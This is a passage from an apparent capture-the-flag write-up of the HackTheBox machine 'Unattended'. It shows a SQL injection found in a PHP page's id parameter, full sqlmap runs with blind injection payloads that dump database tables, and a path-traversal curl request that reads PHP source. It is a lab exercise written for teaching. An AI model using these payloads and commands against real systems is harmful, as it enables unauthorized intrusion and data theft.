&lt;h4 id=&quot;it-defines-an-array-called-valid_ids-then-it-checks-the-get-parameter-id-if-it-exists-and-its-in-the-valid_ids-array-it-will-append-it-to-this-sql-query--select-name-from-idname-where-id--id-here&quot;&gt;It defines an array called &lt;code class=&quot;highlighter-rouge&quot;&gt;valid_ids&lt;/code&gt;, then it checks the &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt;, if it exists and it’s in the &lt;code class=&quot;highlighter-rouge&quot;&gt;valid_ids&lt;/code&gt; array, it will append it to this &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; query : &lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT name FROM idname where id = [ID HERE]&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;to-understand-whats-happening-in-a-better-way-lets-check-the-website-again&quot;&gt;To understand what’s happening in a better way let’s check the website again.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-3-pages-main-about-and-contact--by-visiting-them-we-notice-that-the-id-parameter-is-added-and-each-page-has-one-of-the-ids-we-saw-in-the-php-code--25-main-465-about-and-587-contact&quot;&gt;There are 3 pages, &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;about&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;contact&lt;/code&gt;.  By visiting them we notice that the &lt;code class=&quot;highlighter-rouge&quot;&gt;id&lt;/code&gt; parameter is added and each page has one of the ids we saw in the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code : 25 (main), 465 (about) and 587 (contact).&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/9.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/unattended/10.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/unattended/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-adding-a-single-quote-to-httpswwwnestedflandershtbindexphpid465-and-i-got-the-main-page-instead-of-the-about-page-because-the-query-failed-&quot;&gt;I tried adding a single quote to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.nestedflanders.htb/index.php?id=465&lt;/code&gt; and I got the main page instead of the about page because the query failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;when-i-fixed-the-query-it-worked-&quot;&gt;When I fixed the query it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-started-sqlmap-to-automate-it-and-dump-the-database-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;sqlmap&lt;/code&gt; to automate it and dump the database :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 --dump-all
       __H__
___ ___ [&quot;]_____ ___ ___  {1.3.4#stable}
|_ -| . [.]     | .'| . |                                                                   
|___|_  [']_|_|_|__,|  _|                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                           
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
[*] starting @ 17:12:07 /2019-08-23/

[17:12:08] [INFO] testing connection to the target URL
[17:12:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[17:12:10] [INFO] testing if the target URL content is stable
[17:12:11] [INFO] target URL content is stable
[17:12:11] [INFO] testing if GET parameter 'id' is dynamic
[17:12:12] [INFO] GET parameter 'id' appears to be dynamic                
[17:12:15] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[17:12:16] [INFO] testing for SQL injection on GET parameter 'id'
[17:12:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:12:25] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=&quot;form&quot;)
[17:12:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y 
[17:12:41] [INFO] testing 'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                 
[17:12:42] [INFO] testing 'MySQL &amp;gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'              
[17:12:42] [INFO] testing 'MySQL &amp;gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[17:12:43] [INFO] testing 'MySQL &amp;gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'    
[17:12:44] [INFO] testing 'MySQL &amp;gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'             
[17:12:44] [INFO] testing 'MySQL &amp;gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                  
[17:12:45] [INFO] testing 'MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'            
[17:12:45] [INFO] testing 'MySQL &amp;gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' 
[17:12:46] [INFO] testing 'MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'      
[17:12:47] [INFO] testing 'MySQL &amp;gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'   
[17:12:48] [INFO] testing 'MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'        
[17:12:49] [INFO] testing 'MySQL &amp;gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'        
[17:12:50] [INFO] testing 'MySQL &amp;gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:12:50] [INFO] testing 'MySQL &amp;gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[17:12:51] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[17:12:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:12:53] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:12:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:12:55] [INFO] testing 'MySQL &amp;gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[17:12:56] [INFO] testing 'MySQL &amp;gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[17:12:56] [INFO] testing 'MySQL &amp;gt;= 5.5 error-based - Parameter replace (EXP)'
[17:12:56] [INFO] testing 'MySQL &amp;gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[17:12:56] [INFO] testing 'MySQL &amp;gt;= 5.0 error-based - Parameter replace (FLOOR)'
[17:12:56] [INFO] testing 'MySQL &amp;gt;= 5.1 error-based - Parameter replace (UPDATEXML)'
[17:12:56] [INFO] testing 'MySQL &amp;gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[17:12:56] [INFO] testing 'MySQL inline queries'
[17:12:56] [INFO] testing 'PostgreSQL inline queries'
[17:12:57] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:12:58] [INFO] testing 'MySQL &amp;gt; 5.0.11 stacked queries (comment)'
[17:12:59] [INFO] testing 'MySQL &amp;gt; 5.0.11 stacked queries'
[17:13:00] [INFO] testing 'MySQL &amp;gt; 5.0.11 stacked queries (query SLEEP - comment)'
[17:13:00] [INFO] testing 'MySQL &amp;gt; 5.0.11 stacked queries (query SLEEP)'
[17:13:01] [INFO] testing 'MySQL &amp;lt; 5.0.12 stacked queries (heavy query - comment)'
[17:13:02] [INFO] testing 'MySQL &amp;lt; 5.0.12 stacked queries (heavy query)'
[17:13:03] [INFO] testing 'PostgreSQL &amp;gt; 8.1 stacked queries (comment)'
[17:13:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:13:04] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:13:04] [INFO] testing 'MySQL &amp;gt;= 5.0.12 AND time-based blind'
[17:13:17] [INFO] GET parameter 'id' appears to be 'MySQL &amp;gt;= 5.0.12 AND time-based blind' injectable 
[17:13:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:13:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:13:18] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection tech
nique test
[17:13:22] [INFO] target URL appears to have 1 column in query
[17:13:25] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
[17:13:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[17:13:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[17:14:05] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[17:14:20] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[17:14:35] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[17:14:48] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[17:15:02] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[17:15:16] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[17:15:29] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[17:15:44] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[17:15:59] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 296 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=465' AND 6602=6602 AND 'YxJr'='YxJr

    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind
    Payload: id=465' AND SLEEP(5) AND 'APKt'='APKt
---
[17:16:20] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL &amp;gt;= 5.0.12
[17:16:20] [INFO] sqlmap will dump entries of all tables from all databases now
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;there-are-2-databases-information_schema-and-neddy-&quot;&gt;There are 2 databases, &lt;code class=&quot;highlighter-rouge&quot;&gt;information_schema&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;neddy&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[17:20:49] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL &amp;gt;= 5.0.12
[17:20:49] [INFO] sqlmap will dump entries of all tables from all databases now
[17:20:49] [INFO] fetching database names
[17:20:49] [INFO] fetching number of databases
[17:20:49] [INFO] resumed: 2
[17:20:49] [INFO] retrieving the length of query output
[17:20:49] [INFO] retrieved: 18
[17:21:09] [INFO] retrieved: information_schema
[17:21:09] [INFO] retrieving the length of query output
[17:21:09] [INFO] retrieved: 5
[17:21:21] [INFO] retrieved: neddy
[17:21:21] [INFO] fetching tables for databases: 'information_schema, neddy'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-dont-need-information_schema-in-anything-and-also-dumping-neddy-with-that-kind-of-injection-would-take-a-lot-of-time-lets-take-a-look-at-the-tables&quot;&gt;We don’t need &lt;code class=&quot;highlighter-rouge&quot;&gt;information_schema&lt;/code&gt; in anything and also dumping &lt;code class=&quot;highlighter-rouge&quot;&gt;neddy&lt;/code&gt; with that kind of injection would take a lot of time, let’s take a look at the tables.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[17:37:48] [INFO] fetching tables for database: 'neddy'
[17:37:48] [INFO] fetching number of tables for database 'neddy'
[17:37:48] [INFO] resumed: 11
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 6
[17:37:48] [INFO] resumed: config
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 9
[17:37:48] [INFO] resumed: customers
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 9
[17:37:48] [INFO] resumed: employees
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 8
[17:37:48] [INFO] resumed: filepath
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 6
[17:37:48] [INFO] resumed: idname
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 7
[17:37:48] [INFO] resumed: offices
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 12
[17:37:48] [INFO] resumed: orderdetails
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 6
[17:37:48] [INFO] resumed: orders
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 8
[17:37:48] [INFO] resumed: payments
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 12
[17:37:48] [INFO] resumed: productlines
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 8
[17:37:48] [INFO] resumed: products
[17:37:48] [INFO] fetching columns for table 'customers' in database 'neddy'
[17:37:48] [INFO] resumed: 13
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 14
[17:37:48] [INFO] resumed: customerNumber
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 12
[17:37:48] [INFO] resumed: customerName
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 15
[17:37:48] [INFO] resumed: contactLastName
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 16
[17:37:48] [INFO] resumed: contactFirstName
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 5
[17:37:48] [INFO] resumed: phone
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 12
[17:37:48] [INFO] resumed: addressLine1
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 12
[17:37:48] [INFO] resumed: addressLine2
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 4
[17:37:48] [INFO] resumed: city
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 5
[17:37:48] [INFO] resumed: state
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 10
[17:37:48] [INFO] resumed: postalCode
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 7
[17:37:48] [INFO] resumed: country
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 22
[17:37:48] [INFO] resumed: salesRepEmployeeNumber
[17:37:48] [INFO] retrieving the length of query output
[17:37:48] [INFO] resumed: 11
[17:37:48] [INFO] resumed: creditLimit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-only-dumped-filepath-and-idname-because-these-are-the-ones-i-saw-in-the-source-of-indexphp&quot;&gt;I only dumped &lt;code class=&quot;highlighter-rouge&quot;&gt;filepath&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;idname&lt;/code&gt; because these are the ones I saw in the source of &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt;.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T filepath --dump --threads 10                  
       __H__
 ___ ___[']_____ ___ ___  {1.3.4#stable} 
|_ -| . [)]     | .'| . | 
|___|_  [&quot;]_|_|_|__,|  _| 
      |_|V...       |_|   http://sqlmap.org                                                                            
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\

[*] starting @ 17:55:21 /2019-08-23/
[17:55:21] [INFO] resuming back-end DBMS 'mysql'
[17:55:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:                       
---        
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=465' AND 6602=6602 AND 'YxJr'='YxJr
    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind
    Payload: id=465' AND SLEEP(5) AND 'APKt'='APKt
---
[17:55:22] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL &amp;gt;= 5.0.12
[17:55:22] [INFO] fetching columns for table 'filepath' in database 'neddy'
[17:55:22] [INFO] retrieved: 2
[17:55:27] [INFO] retrieving the length of query output
[17:55:27] [INFO] retrieved: 4
[17:55:36] [INFO] retrieved: name
[17:55:36] [INFO] retrieving the length of query output
[17:55:36] [INFO] retrieved: 4
[17:55:44] [INFO] retrieved: path
[17:55:44] [INFO] fetching entries for table 'filepath' in database 'neddy'
[17:55:44] [INFO] fetching number of entries for table 'filepath' in database 'neddy'
[17:55:44] [INFO] retrieved: 3
[17:55:49] [INFO] retrieving the length of query output
[17:55:49] [INFO] retrieved: 36
[17:56:25] [INFO] retrieved: 47c1ba4f7b1edf28ea0e2bb250717093.php
[17:56:25] [INFO] retrieving the length of query output
[17:56:25] [INFO] retrieved: 5
[17:56:35] [INFO] retrieved: about
[17:56:35] [INFO] retrieving the length of query output
[17:56:35] [INFO] retrieved: 36
[17:57:10] [INFO] retrieved: 0f710bba8d16303a415266af8bb52fcb.php
[17:57:10] [INFO] retrieving the length of query output
[17:57:10] [INFO] retrieved: 7
[17:57:21] [INFO] retrieved: contact
[17:57:21] [INFO] retrieving the length of query output
[17:57:21] [INFO] retrieved: 36
[17:57:55] [INFO] retrieved: 787c75233b93aa5e45c3f85d130bfbe7.php
[17:57:55] [INFO] retrieving the length of query output
[17:57:55] [INFO] retrieved: 4
[17:58:05] [INFO] retrieved: main
Database: neddy
Table: filepath
[3 entries]
+---------+--------------------------------------+
| name    | path                                 |
+---------+--------------------------------------+
| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
| contact | 0f710bba8d16303a415266af8bb52fcb.php |
| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+---------+--------------------------------------+

[17:58:05] [INFO] table 'neddy.filepath' dumped to CSV file '/root/.sqlmap/output/www.nestedflanders.htb/dump/neddy/filepath.csv'             
[17:58:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.nestedflanders.htb'
[*] ending @ 17:58:05 /2019-08-23/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T idname --dump --threads 10
        ___               
       __H__
 ___ ___[)]_____ ___ ___  {1.3.4#stable} 
|_ -| . [)]     | .'| . |  
|___|_  [&quot;]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org                                                                            
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program           

[*] starting @ 18:03:42 /2019-08-23/
[18:03:42] [INFO] resuming back-end DBMS 'mysql'
[18:03:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:                       
---        
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=465' AND 6602=6602 AND 'YxJr'='YxJr
    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind
    Payload: id=465' AND SLEEP(5) AND 'APKt'='APKt                       
---
[18:03:43] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.10.3
back-end DBMS: MySQL &amp;gt;= 5.0.12
[18:03:43] [INFO] fetching columns for table 'idname' in database 'neddy'
[18:03:43] [INFO] resumed: 3
[18:03:43] [INFO] retrieving the length of query output
[18:03:43] [INFO] retrieved: 2
[18:03:52] [INFO] retrieved: id
[18:03:52] [INFO] retrieving the length of query output
[18:03:52] [INFO] retrieved: 4
[18:04:02] [INFO] retrieved: name
[18:04:02] [INFO] retrieving the length of query output
[18:04:02] [INFO] retrieved: 8
[18:04:12] [INFO] retrieved: disabled
[18:04:12] [INFO] fetching entries for table 'idname' in database 'neddy'
[18:04:12] [INFO] fetching number of entries for table 'idname' in database 'neddy'
[18:04:12] [INFO] retrieved: 6
[18:04:17] [INFO] retrieving the length of query output
[18:04:17] [INFO] retrieved: 1
[18:04:21] [INFO] retrieved: 1
[18:04:27] [INFO] retrieving the length of query output
[18:04:27] [INFO] retrieved: 1
[18:04:33] [INFO] retrieved: 1
[18:04:39] [INFO] retrieving the length of query output
[18:04:39] [INFO] retrieved: 8
[18:04:51] [INFO] retrieved: main.php
[18:04:51] [INFO] retrieving the length of query output
[18:04:51] [INFO] retrieved: 1
[18:04:55] [INFO] retrieved: 1
[18:05:01] [INFO] retrieving the length of query output
[18:05:01] [INFO] retrieved: 1
[18:05:05] [INFO] retrieved: 2
[18:05:12] [INFO] retrieving the length of query output
[18:05:12] [INFO] retrieved: 9
[18:05:24] [INFO] retrieved: about.php
[18:05:24] [INFO] retrieving the length of query output
[18:05:24] [INFO] retrieved: 1
[18:05:28] [INFO] retrieved: 1
[18:05:34] [INFO] retrieving the length of query output
[18:05:34] [INFO] retrieved: 1
[18:05:38] [INFO] retrieved: 3
[18:05:44] [INFO] retrieving the length of query output
[18:05:44] [INFO] retrieved: 11
[18:06:01] [INFO] retrieved: contact.php
[18:06:01] [INFO] retrieving the length of query output
[18:06:01] [INFO] retrieved: 1
[18:06:05] [INFO] retrieved: 0
[18:06:11] [INFO] retrieving the length of query output
[18:06:11] [INFO] retrieved: 2
[18:06:21] [INFO] retrieved: 25
[18:06:21] [INFO] retrieving the length of query output
[18:06:21] [INFO] retrieved: 4
[18:06:31] [INFO] retrieved: main
[18:06:31] [INFO] retrieving the length of query output
[18:06:31] [INFO] retrieved: 1
[18:06:35] [INFO] retrieved: 0
[18:06:41] [INFO] retrieving the length of query output
[18:06:41] [INFO] retrieved: 3
[18:06:51] [INFO] retrieved: 465
[18:06:51] [INFO] retrieving the length of query output
[18:06:51] [INFO] retrieved: 5
[18:07:01] [INFO] retrieved: about
[18:07:01] [INFO] retrieving the length of query output
[18:07:01] [INFO] retrieved: 1
[18:07:05] [INFO] retrieved: 0
[18:07:12] [INFO] retrieving the length of query output
[18:07:12] [INFO] retrieved: 3
[18:07:22] [INFO] retrieved: 587
[18:07:22] [INFO] retrieving the length of query output
[18:07:22] [INFO] retrieved: 7
[18:07:32] [INFO] retrieved: contact
Database: neddy
Table: idname
[6 entries]
+-----+-------------+----------+
| id  | name        | disabled |
+-----+-------------+----------+
| 1   | main.php    | 1        |
| 2   | about.php   | 1        |
| 3   | contact.php | 1        |
| 25  | main        | 0        |
| 465 | about       | 0        |
| 587 | contact     | 0        |
+-----+-------------+----------+

[18:07:32] [INFO] table 'neddy.idname' dumped to CSV file '/root/.sqlmap/output/www.nestedflanders.htb/dump/neddy/idname.csv'               
[18:07:32] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.nestedflanders.htb'
[*] ending @ 18:07:32 /2019-08-23/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;sqli-to-lfi&quot;&gt;SQLI to LFI&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-the-actual-file-names-about-for-example-47c1ba4f7b1edf28ea0e2bb250717093php--&quot;&gt;Now we have the actual file names, &lt;code class=&quot;highlighter-rouge&quot;&gt;about&lt;/code&gt; for example (&lt;code class=&quot;highlighter-rouge&quot;&gt;/47c1ba4f7b1edf28ea0e2bb250717093.php &lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/unattended/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-just-the-text-and-nothing-else-we-can-also-verify-that-there-is-nothing-hidden-by-checking-the-php-source-of-the-three-pages-&quot;&gt;It’s just the text and nothing else. We can also verify that there is nothing hidden by checking the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; source of the three pages :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/47c1ba4f7b1edf28ea0e2bb250717093.php
&amp;lt;body class=&quot;container&quot;&amp;gt;
&amp;lt;div&amp;gt;
Hello &amp;lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : &quot;visitor&quot; ; ?&amp;gt;,&amp;lt;br&amp;gt;
our Company is world wide leading expert about Nesting stuff.&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
We can nest almost everything after or before anything based on your needs.&amp;lt;br&amp;gt;
Feel free to contact us with usual email addresses, our contact form is currently offline because of a recent attack.
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/0f710bba8d16303a415266af8bb52fcb.php
&amp;lt;body class=&quot;container&quot;&amp;gt;
Hello &amp;lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : &quot;visitor&quot; ; ?&amp;gt;,&amp;lt;br&amp;gt;

thanks for getting in touch with us!&amp;lt;br&amp;gt;
Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.&amp;lt;br&amp;gt;
Please come back later.&amp;lt;/br&amp;gt;
&amp;lt;/body&amp;gt;
root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/787c75233b93aa5e45c3f85d130bfbe7.php
&amp;lt;body class=&quot;container&quot;&amp;gt;
&amp;lt;div&amp;gt;
&amp;lt;img src=787c75233b93aa5e45c3f85d130bfbe7.gif&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
Hello &amp;lt;?php echo (isset($_GET['name'])) ? $_GET['name'] : &quot;visitor&quot; ; ?&amp;gt;,&amp;lt;br&amp;gt;
we are very sorry to show you this ridiculous page but we had to restore our website to 2001-layout.
&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
As a partial recover, we offer you a printed portfolio: just drop us an email with a contact request.
&amp;lt;/div&amp;gt;
&amp;lt;div&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;first-guess-will-be-that-the-page-name-gets-queried-from-the-database-table-idname-then-the-path-or-the-actual-php-file-name-gets-queried-from-the-database-table-filepath-then-it-includes-that-page-to-the-index-page-and-thats-true-but-since-we-have-the-source-of-indexphp-lets-also-look-at-it&quot;&gt;First guess will be that the page name gets queried from the database table &lt;code class=&quot;highlighter-rouge&quot;&gt;idname&lt;/code&gt; then the path (or the actual &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file name) gets queried from the database table &lt;code class=&quot;highlighter-rouge&quot;&gt;filepath&lt;/code&gt; then it includes that page to the index page. And that’s true but since we have the source of &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; let’s also look at it.&lt;/h4&gt;
&lt;h4 id=&quot;by-looking-at-the-dumped-tables-and-the-source-of-indexphp-again-we-can-understand-the-following-&quot;&gt;By looking at the dumped tables and the source of &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt; again we can understand the following :&lt;/h4&gt;
